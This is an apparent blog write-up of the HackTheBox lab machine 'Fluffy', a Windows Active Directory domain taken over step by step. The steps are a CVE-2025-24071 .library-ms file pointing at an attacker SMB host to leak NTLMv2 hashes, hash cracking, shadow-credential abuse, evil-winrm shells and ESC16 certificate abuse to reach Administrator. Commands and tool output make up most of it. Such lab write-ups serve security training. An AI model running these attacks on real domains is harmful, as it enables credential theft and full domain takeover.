---
title: "HackTheBox - Fluffy"
author: Nasrallah
description: ""
date: 07:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, windows, activedirectory, ad, adcs, certipy, shadow-credentials, easy]
img_path: /assets/img/hackthebox/machines/fluffy
image:
    path: fluffy.png
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---

[Fluffy](https://app.hackthebox.com/machines/fluffy) is an easy-difficulty Windows machine designed around an assumed breach scenario, where credentials for a low-privileged user are provided. By exploiting [CVE-2025-24071](https://nvd.nist.gov/vuln/detail/CVE-2025-24071), the credentials of another low-privileged user can be obtained. Further enumeration reveals the existence of ACLs over the `winrm_svc` and `ca_svc` accounts. `WinRM` can then be used to log in to the target using the `winrc_svc` account. Exploitation of an Active Directory Certificate service (`ESC16`) using the `ca_svc` account is required to obtain access to the `Administrator` account.

Credentials provided for the box `j.fleischman / J0elTHEM4n1990!`

## **Enumeration**

### nmap

We start an Nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.11.69     
Host is up (0.34s latency).            
Not shown: 990 filtered tcp ports (no-response)                    
PORT     STATE SERVICE       VERSION   
53/tcp   open  domain        Simple DNS Plus                       
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-25 02:05:47Z)    
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn         
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)                                                                    
| ssl-cert: Subject: commonName=DC01.fluffy.htb                    
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
|_ssl-date: 2025-05-25T02:07:48+00:00; +7h00m01s from scanner time.
445/tcp  open  microsoft-ds?           
464/tcp  open  kpasswd5?               
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0   
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)                                                                    
|_ssl-date: 2025-05-25T02:07:47+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb                    
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)                                                                    
|_ssl-date: 2025-05-25T02:07:48+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb                    
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)                                                                    
|_ssl-date: 2025-05-25T02:07:47+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb                    
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows  
Host script results: 
| smb2-security-mode:fluffy
|   3:1:1:           
|_    Message signing enabled and required                         
| smb2-time:         
|   date: 2025-05-25T02:07:08          
|_  start_date: N/A  
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s            
```

The target appears to be an Active Directory Domain controller with the domain name `fluffy.htb` and DC 'DC01.fluffy.htb`. Let's adds those to our /etc/hosts file.

### SMB

Using the credentials provided let's list shares.

```terminal
[★]$ nxc smb 10.10.11.69 -u j.fleischman -p 'J0elTHEM4n1990!' --shares
SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domin:fluffy.htb) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.10.11.69     445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
SMB         10.10.11.69     445    DC01             [*] Enumerated shares
SMB         10.10.11.69     445    DC01             Share           Permissions     Remark
SMB         10.10.11.69     445    DC01             -----           -----------     ------
SMB         10.10.11.69     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.69     445    DC01             C$                              Default share
SMB         10.10.11.69     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.69     445    DC01             IT              READ,WRITE      
SMB         10.10.11.69     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.69     445    DC01             SYSVOL          READ            Logon server share
```

There is a share named `IT` we can read and write to.

Let's connect to it.

```terminal
[★]$ smbclient //fluffy.htb/IT -U j.fleischman%'J0elTHEM4n1990!'                 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Sep 28 16:19:03 2025
  ..                                  D        0  Sun Sep 28 16:19:03 2025
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 16:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 16:04:05 2025
  KeePass-2.58                        D        0  Fri Apr 18 16:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 16:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 15:31:07 2025
```

There is a pdf file and some zip files, let's download the pdf file and open it.

![pdffile](1.png)

The file revealed some vulnerabilities giving us a hint on what to do.

I searched for the CVEs and found the following [exploit](https://github.com/helidem/CVE-2025-24054_CVE-2025-24071-PoC/) on `CVE-2025-24071`.

>When a .library-ms file with a UNC path is opened (or previewed) in Windows Explorer, it triggers an SMB authentication request to the specified server, leaking the NTLMv2 hash.
{: .prompt-info }

I'll clone the repo to my machine and run the exploit.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\10.10.16.19\share</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

The exploit creates `xd.library-ms` file, I'll edit the IP address to mine and upload the file to the SMB share.

```terminal
smb: \> put xd.library-ms 
putting file xd.library-ms as \xd.library-ms (0.9 kb/s) (average 0.9 kb/s)
```

Now I'll start Responder and wait.

![responder](2.png)

I managed to get the NTLMv2 hash of user p.agile

Let's crack the hash using hashcat with mode 5600.

```terminal
[★]$ hashcat hash /usr/share/wordlists/rockyou.txt -m 5600
hashcat (v6.2.6) starting

Dictionary cache hit:                                                                                                                                                                         
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

P.AGILA::FLUFFY:60a1286fb28bb70e:1b809b3c781574ea946074b1ca1747c5:0101000000000000006470595a30dc01d9a4419c74d50a3a0000000002000800530057003200470001001e00570049004e002d00480049005a004600490036004e0044004d003900420004003400570049004e002d00480049005a004600490036004e0044004d00390042002e0053005700320047002e004c004f00430041004c000300140053005700320047002e004c004f00430041004c000500140053005700320047002e004c004f00430041004c0007000800006470595a30dc01060004000200000008003000300000000000000001000000002000004b8b52283a5db9ad636fd859fd28e315edbbc9c3153034ce1eae30cb3053b2d10a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e00310039000000000000000000:prometheusx-303

```

We got the clear text password of `p.agila`.

After running bloodhound, and listing outbound connections we get the following:

![bloodhound](3.png)

## **Foothold**

The user `p.agila` is a member of the `Service Account Managers` group, which has `GenericAll` privileges over the `Service Accounts` group. In turn, the `Service Accounts` group holds `GenericWrite` privileges over three service accounts.

Let's first add our user to the `Service Accounts` group:

```bash
[★]$ bloodyAD --host fluffy.htb -d fluffy.htb -u p.agila -p prometheusx-303 add groupMember "Service Accounts" p.agila
[+] p.agila added to Service Accounts
```

Now let's exploit the `GenericWrite` to perform shadow credentials attack.

```bash
╼[★]$ bloodyAD --host fluffy.htb -d fluffy.htb -u p.agila -p prometheusx-303 add shadowCredentials ca_svc
[+] KeyCredential generated with following sha256 of RSA key: 78da420e2fd452f59d37a574438a31de6bfdec09496fbdf3cfc571cef4516d79
[+] TGT stored in ccache file ca_svc_vC.ccache

NT: ca0f4f9e9eb8a092addf53bb03fc98c8
                                                                                                                                                                                              
╼[★]$ bloodyAD --host fluffy.htb -d fluffy.htb -u p.agila -p prometheusx-303 add shadowCredentials winrm_svc
[+] KeyCredential generated with following sha256 of RSA key: 47bd196f2d68009f09b76415c39d302993a07c9b84c496bacd3b8deabee13027
[+] TGT stored in ccache file winrm_svc_j9.ccache

NT: 33bd09dcd697600edf6b3a7af4875767
                                                                                                                                                                                              
╼[★]$ bloodyAD --host fluffy.htb -d fluffy.htb -u p.agila -p prometheusx-303 add shadowCredentials ldap_svc 
[+] KeyCredential generated with following sha256 of RSA key: 95fb40d62044054e5902ef9f2f5a01bc406a6744ddef1e3dc6c23702f634418c
[+] TGT stored in ccache file ldap_svc_mP.ccache

NT: 22151d74ba3de931a352cba1f9393a37
```

We managed to get the NT hash of the accounts.

The same attack can be done using `certipy`

```bash
[★]$ certipy shadow auto -account ca_svc -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip 10.10.11.69              
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '47c1c63c-7561-e50d-186a-60fe081b633f'
[*] Adding Key Credential with device ID '47c1c63c-7561-e50d-186a-60fe081b633f' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID '47c1c63c-7561-e50d-186a-60fe081b633f' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'ca_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ca_svc.ccache'
[*] Wrote credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
```

We can use the hash of winrm_svc to get a shell on the target using `evil-winrm`

```terminal
[★]$ evil-winrm -i fluffy.htb -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\winrm_svc\Documents>
```

## **Privilege Escalation**

Bloodhound showed us earlier that ca_svc is member of `Cert Publishers` group.

Let's enumerate vulnerable Certs using `certipy.

```terminal
[★]$ certipy find -vulnerable -u ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -stdout  
Certipy v5.0.2 - by Oliver Lyak (ly4k)                                                         
                                                                                               
[*] Finding certificate templates                                                              
[*] Found 33 certificate templates                                                             
[*] Finding certificate authorities
[*] Found 1 certificate authority                                                              
[*] Found 11 enabled certificate templates
[*] Finding issuance policies                                                                  
[*] Found 14 issuance policies                                                                 
[*] Found 0 OIDs linked to templates                                                           
[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP      
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'   
[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace                                                           
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace                                                                                                                                                          
[*] Enumeration output:              
Certificate Authorities
  0                                                                                            
    CA Name                             : fluffy-DC01-CA                          
    DNS Name                            : DC01.fluffy.htb
    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
    Certificate Validity Start          : 2025-04-17 16:00:16+00:00                                                                                                                           
    Certificate Validity End            : 3024-04-17 16:11:16+00:00
    Web Enrollment                                                                                                                                                                            
      HTTP                               
        Enabled                         : False 
      HTTPS                                   
        Enabled                         : False 
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue 
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
    Permissions
      Owner                             : FLUFFY.HTB\Administrators
      Access Rights
        ManageCa                        : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        ManageCertificates              : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        Enroll                          : FLUFFY.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC16                             : Security Extension is disabled.
    [*] Remarks
      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
Certificate Templates                   : [!] Could not find any certificate templates
```

We found that the CA `fluffy-DC01-CA` is vulnerable to `ESC16`

Using the following [guide](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally) we can exploit the vulnerability to get the administrator's pfx and then it's NT hash.

The following are the commands we need to run

```terminal
certipy account -u ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -user ca_svc -dc-ip 10.10.11.69 -upn 'administrator' update
certipy req -dc-ip 10.10.11.69 -u ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -target 'DC01.fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User'
certipy account -u ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -user ca_svc -dc-ip 10.10.11.69 -upn 'administrator@fluffy.htb' update
certipy auth -dc-ip 10.10.11.69 -pfx administrator.pfx -username administrator -domain 'fluffy.htb'
```

First Update the victim account's UPN to the target administrator's sAMAccountName.

```bash
[★]$ certipy account -u ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -user ca_svc -dc-ip 10.10.11.69 -upn 'administrator' update
Certipy v5.0.2 - by Oliver Lyak (ly4k)                                                         
                                                                                                                                                                                              
[*] Updating user 'ca_svc':
    userPrincipalName: administrator
[*] Successfully updated 'ca_svc' 
```

Next we request a certificate as the "Administrator" user.

```bash
[★]$ certipy req -dc-ip 10.10.11.69 -u ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -target 'DC01.fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User'
Certipy v5.0.2 - by Oliver Lyak (ly4k)                                                         

[*] Requesting certificate via RPC
[*] Request ID is 15
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

Now we revert the "ca_svc" account's UPN

```bash
[★]$ certipy account -u ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -user ca_svc -dc-ip 10.10.11.69 -upn 'administrator@fluffy.htb' update
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : administrator@fluffy.htb
[*] Successfully updated 'ca_svc'
```

And now we can authenticate using the administrator's certificate to get the NT hash.

```bash
[★]$ certipy auth -dc-ip 10.10.11.69 -pfx administrator.pfx -username administrator -domain 'fluffy.htb'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*] Using principal: 'administrator@fluffy.htb' 
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
```

Using the hash we can get a shell using evil-winrm.

```terminal
[★]$ evil-winrm -i fluffy.htb -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
fluffy\administrator
```

## **References**

<https://nvd.nist.gov/vuln/detail/CVE-2025-24071>

<https://github.com/helidem/CVE-2025-24054_CVE-2025-24071-PoC/>

<https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally>

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
